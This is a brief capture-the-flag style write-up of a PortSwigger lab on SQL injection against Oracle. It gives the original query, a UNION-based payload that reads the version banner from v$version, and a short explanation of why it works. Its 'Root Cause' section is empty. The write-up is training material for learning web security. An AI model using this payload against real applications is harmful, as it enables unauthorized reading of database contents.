# Lab:  SQL injection attack, querying the database type and version on Oracle

**Difficulty:** PRACTITIONER

**Category:** SQL Injection

**Lab URL:** https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

## Vulnerability
SQL Injection

## Root Cause


## Original Query
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

## Payload
```sql
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```

## Why it Works
The input isn't sanitized, the user can change the category at the URL, and add malicious SQL Code that goes directly in the query, from which we can use UNION to select the database version

## Impact
Attacker can read data that they shouldn't  be able to see